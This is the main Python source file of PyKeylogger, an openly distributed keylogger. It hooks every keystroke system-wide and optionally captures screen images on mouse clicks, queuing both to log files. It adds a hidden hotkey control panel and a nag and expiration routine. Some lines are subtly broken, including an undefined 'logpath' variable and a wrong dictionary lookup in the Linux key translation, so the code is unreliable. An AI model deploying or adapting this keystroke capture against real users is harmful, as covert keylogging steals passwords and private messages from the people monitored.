##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2007  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

import os
import os.path
import time
import sys
if os.name == 'posix':
    import pyxhook as hooklib
elif os.name == 'nt':
    import pyHook as hooklib
    import pythoncom
else:
    print "OS is not recognised as windows or linux."
    exit()

#import imp # don't need this anymore?
import re
from optparse import OptionParser
import traceback
from logwriter import LogWriter
from imagecapture import ImageWriter
import version
#import ConfigParser
from configobj import ConfigObj
from validate import Validator
from controlpanel import PyKeyloggerControlPanel
from supportscreen import SupportScreen, ExpirationScreen
import Tkinter, tkMessageBox
import myutils
import Queue
from Queue import Empty # to avoid some weird exceptions on exit
import threading
import logging

class KeyLogger:
    '''Captures all keystrokes, enqueue events.
    
       Puts keystrokes events in queue for later processing by the LogWriter
       class.
       
       '''
    def __init__(self):
        self.ParseOptions() # stored in self.cmdoptions
        self.ParseConfigFile() # stored in self.settings
        self.ParseControlKey()
        self.NagscreenLogic()
        self.process_settings()
        self.create_loggers()
        self.q_logwriter = Queue.Queue(0)
        self.q_imagewriter = Queue.Queue(0)
        self.lw = LogWriter(self.settings,
                            self.cmdoptions,
                            self.q_logwriter)
        self.iw = ImageWriter(self.settings,
                              self.cmdoptions,
                              self.q_imagewriter)
        if os.name == 'posix':
            self.hashchecker = ControlKeyMonitor(self.cmdoptions,
                                                 self.lw,
                                                 self,
                                                 self.ControlKeyHash)
        self.hm = hooklib.HookManager()
        
        if self.settings['General']['Hook Keyboard'] == True:
            self.hm.HookKeyboard()
            self.hm.KeyDown = self.OnKeyDownEvent
            self.hm.KeyUp = self.OnKeyUpEvent
        
        if self.settings['Image Capture']['Capture Clicks'] == True:
            self.hm.HookMouse()
            self.hm.MouseAllButtonsDown = self.OnMouseDownEvent
        
        #if os.name == 'nt':
        self.panel = False
        
        #if self.options.hookMouse == True:
        #   self.hm.HookMouse()

    def start(self):
        self.lw.start()
        self.iw.start()
        if os.name == 'nt':
            pythoncom.PumpMessages()
        if os.name == 'posix':
            self.hashchecker.start()
            self.hm.start()
        
    def process_settings(self):
        '''Sanitizes user input and detects full path of the log directory.
        
           We can change things in the settings configobj with impunity here,
           since the control panel process get a fresh read of settings from
           file before doing anything.
           
           '''
        log_dir = os.path.normpath(self.settings['General']['Log Directory'])
        if os.path.isabs(self.settings['General']['Log Directory']):
            self.settings['General']['Log Directory'] = log_dir
        else:
            self.settings['General']['Log Directory'] = \
               os.path.join(myutils.get_main_dir(), log_dir)
        
        # Regexp filter for the non-allowed characters in windows filenames.
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
        self.settings['General']['Log File'] = \
           self.filter.sub(r'__',self.settings['General']['Log File'])
        self.settings['General']['System Log'] = \
           self.filter.sub(r'__',self.settings['General']['System Log'])
        
        # todo: also want to run imagesdirectoryname (tbc) through self.filter 
        
    def ParseControlKey(self):
        self.ControlKeyHash = \
           ControlKeyHash(self.settings['General']['Control Key'])
    
    def create_loggers(self):
    
        # configure default root logger to log all debug messages to stdout
        logging.basicConfig(level=logging.DEBUG,
                        format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
                        stream = sys.stdout) 
        
        # configure the "systemlog" handler to log all debug messages to file
        if self.settings['General']['System Log'] != 'None':
            systemlogpath = os.path.join(self.settings['General']['Log Directory'], 
                                                        self.settings['General']['System Log'])
            systemloghandler = logging.FileHandler(systemlogpath)
            systemloghandler.setLevel(logging.DEBUG)
            systemlogformatter = logging.Formatter('%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
            systemloghandler.setFormatter(systemlogformatter)
            logging.getLogger('').addHandler(systemloghandler)
        
        # configure the main data logger
        mainlogger = logging.getLogger('mainlog')
        mainlogpath = os.path.join(self.settings['General']['Log Directory'], 
                                                self.settings['General']['Log File'])
        mainloghandler = myutils.OnDemandRotatingFileHandler(logpath)
        mainloghandler.setLevel(logging.INFO)
        mainlogformatter = logging.Formatter('%(message)s')
        mainloghandler.setFormatter(mainlogformatter)
        mainlogger.addHandler(mainloghandler)
    
    def OnKeyDownEvent(self, event):
        '''Called when a key is pressed.
        
           Puts the event in queue, updates the control key combo status,
           and passes the event on to the system.
           
           '''
        self.q_logwriter.put(event)
        
        self.ControlKeyHash.update(event)
        
        if self.cmdoptions.debug:
                self.lw.PrintDebug("control key status: " + str(self.ControlKeyHash))
                
        # We have to open the panel from main thread on windows, otherwise it
        # hangs. This is possibly due to some interaction with the python
        # message pump and tkinter.
        # On linux, on the other hand, doing it from a separate worker thread
        # is a must since the pyxhook module blocks until panel is closed,
        # so we do it with the hashchecker thread instead.
        if os.name == 'nt':
            if self.ControlKeyHash.check():
                if not self.panel:
                    self.lw.PrintDebug("starting panel")
                    self.panel = True
                    self.ControlKeyHash.reset()
                    PyKeyloggerControlPanel(self.cmdoptions, self)
        return True
    
    def OnKeyUpEvent(self,event):
        self.ControlKeyHash.update(event)
        return True
    
    def OnMouseDownEvent(self,event):
        self.q_imagewriter.put(event)
        return True
    
    def stop(self):
        '''Exit cleanly.'''
        if os.name == 'posix':
            self.hm.cancel()
            self.hashchecker.cancel()
        self.lw.cancel()
        self.iw.cancel()
        
        #print threading.enumerate()
        sys.exit()
    
    def ParseOptions(self):
        '''Read command line options.'''
        version_str = version.description + " version " + version.version + \
                      " (" + version.url + ")."
        parser = OptionParser(version=version_str)
        parser.add_option("-d", "--debug",
           action="store_true", dest="debug",
           help="debug mode (print output to console instead of the log file) "
                "[default: %default]")
        parser.add_option("-c", "--configfile",
           action="store", dest="configfile",
           help="filename of the configuration ini file. [default: %default]")
        parser.add_option("-v", "--configval",
           action="store", dest="configval",
           help="filename of the configuration validation file. "
                "[default: %default]")
        
        parser.set_defaults(debug=False,
                            configfile=version.name + ".ini",
                            configval=version.name + ".val")
        
        self.cmdoptions, args = parser.parse_args()
    
    def ParseConfigFile(self):
        '''Reads config file options from .ini file.
        
           Filename as specified by "--configfile" option,
           default "pykeylogger.ini".
           
           Validation file specified by "--configval" option,
           default "pykeylogger.val".
           
           Give detailed error box and exit if validation on the config file
           fails.
           
           '''
        
        if not os.path.isabs(self.cmdoptions.configfile):
            self.cmdoptions.configfile = os.path.join(
                myutils.get_main_dir(), self.cmdoptions.configfile)
        if not os.path.isabs(self.cmdoptions.configval):
            self.cmdoptions.configval = os.path.join(
                myutils.get_main_dir(), self.cmdoptions.configval)
            
        self.settings = ConfigObj(self.cmdoptions.configfile,
                                  configspec=self.cmdoptions.configval,
                                  list_values=False)

        # validate the config file
        errortext = "Some of your input contains errors. " + \
                    "Detailed error output below.\n\n"
        val = Validator()
        valresult = self.settings.validate(val, preserve_errors=True)
        error_tpl = "Error in item \"%s\": %s\n"
        if valresult != True:
            for section in valresult.keys():
                if valresult[section] != True:
                    sectionval = valresult[section]
                    for key in sectionval.keys():
                        if sectionval[key] != True:
                            errortext += error_tpl % \
                               (str(key), str(sectionval[key]))
            tkMessageBox.showerror("Errors in config file. Exiting.",
                                   errortext)
            sys.exit()
        
    def NagscreenLogic(self):
        '''Show the nagscreen (or not).'''
        
        # Congratulations, you have found the nag control.
        # See, that wasn't so hard, was it? :)
        # While I have deliberately made it easy to stop all this nagging and
        # expiration stuff here, and you are quite entitled to doing just that,
        # I would like to take this final moment and encourage you once more to
        # support the PyKeylogger project by making a donation.
        
        # Set this to False to get rid of all nagging.
        NagMe = True
        
        if NagMe == True:
            # first, show the support screen
            root = Tkinter.Tk()
            root.geometry("100x100+200+200")
            warn = SupportScreen(root, title="Please Support PyKeylogger",
                                 rootx_offset=-20, rooty_offset=-35)
            root.destroy()
            del(warn)
            
            # set the timer if first use
            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
            if myutils.password_recover(utfnd) == "firstuse":
                self.settings['General']['Usage Time Flag NoDisplay'] = \
                   myutils.password_obfuscate(str(time.time()))
                self.settings.write()
            
            # then, see if we have "expired"
            utfnd = self.settings['General']['Usage Time Flag NoDisplay']
            if abs(time.time() - float(myutils.password_recover(utfnd))) > \
               3600 * 24 * 4:
                root = Tkinter.Tk()
                root.geometry("100x100+200+200")
                warn = ExpirationScreen(root, title="PyKeylogger Has Expired",
                                        rootx_offset=-20, rooty_offset=-35)
                root.destroy()
                del(warn)
                sys.exit()

class ControlKeyHash:
    '''Encapsulates the control key dictionary.
       
       This dictionary is used to keep track of whether the control key combo
       has been pressed.
       
       '''
    def __init__(self, controlkeysetting):
        
        #~ lin_win_dict = {'Alt_L':'Lmenu',
                                    #~ 'Alt_R':'Rmenu',
                                    #~ 'Control_L':'Lcontrol',
                                    #~ 'Control_R':'Rcontrol',
                                    #~ 'Shift_L':'Lshift',
                                    #~ 'Shift_R':'Rshift',
                                    #~ 'Super_L':'Lwin',
                                    #~ 'Super_R':'Rwin'}
        
        lin_win_dict = {'Alt_l':'Lmenu',
                                    'Alt_r':'Rmenu',
                                    'Control_l':'Lcontrol',
                                    'Control_r':'Rcontrol',
                                    'Shift_l':'Lshift',
                                    'Shift_r':'Rshift',
                                    'Super_l':'Lwin',
                                    'Super_r':'Rwin',
                                    'Page_up':'Prior'}
                                    
        win_lin_dict = dict([(v,k) for (k,v) in lin_win_dict.iteritems()])
        
        self.controlKeyList = controlkeysetting.split(';')
        
        # Capitalize all items for greater tolerance of variant user inputs.
        self.controlKeyList = \
           [item.capitalize() for item in self.controlKeyList]
        # Remove duplicates.
        self.controlKeyList = list(set(self.controlKeyList))
        
        # Translate linux versions of key names to windows, or vice versa,
        # depending on what platform we are on.
        if os.name == 'nt':
            for item in self.controlKeyList:
                if item in lin_win_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = \
                       lin_win_dict[item]
        elif os.name == 'posix':
            for item in self.controlKeyList:
                if item in win_lin_dict.keys():
                    self.controlKeyList[self.controlKeyList.index(item)] = \
                       lin_win_dict[item]
        
        self.controlKeyHash = dict(zip(
           self.controlKeyList,
           [False for item in self.controlKeyList]))
    
    def update(self, event):
        if event.MessageName == 'key down' and \
           event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = True
        if event.MessageName == 'key up' and \
           event.Key.capitalize() in self.controlKeyHash.keys():
            self.controlKeyHash[event.Key.capitalize()] = False
    
    def reset(self):
        for key in self.controlKeyHash.keys():
            self.controlKeyHash[key] = False
    
    def check(self):
        if self.controlKeyHash.values() == [True] * len(self.controlKeyHash):
            return True
        else:
            return False
            
    def __str__(self):
        return str(self.controlKeyHash)

class ControlKeyMonitor(threading.Thread):
    '''Polls the control key hash status periodically.
       
       Done to see if the control key combo has been pressed.
       Brings up control panel if it has.
       
       '''
    def __init__(self, cmdoptions, logwriter, mainapp, controlkeyhash):
        threading.Thread.__init__(self)
        self.finished = threading.Event()
        
        # panel flag - true if panel is up, false if not
        # this way we don't start a second panel instance when it's already up
        #self.panel=False
        
        self.lw = logwriter
        self.mainapp = mainapp
        self.cmdoptions = cmdoptions
        self.ControlKeyHash = controlkeyhash
        
    def run(self):
        while not self.finished.isSet():
            if self.ControlKeyHash.check():
                if not self.mainapp.panel:
                    self.lw.PrintDebug("starting panel")
                    self.mainapp.panel = True
                    self.ControlKeyHash.reset()
                    PyKeyloggerControlPanel(self.cmdoptions, self.mainapp)
            time.sleep(0.05)
        
    def cancel(self):
        self.finished.set()
        

if __name__ == '__main__':
    kl = KeyLogger()
    kl.start()
    
    # If you want to change keylogger behavior from defaults,
    # modify the .ini file. Also try '-h' for list of command line options.
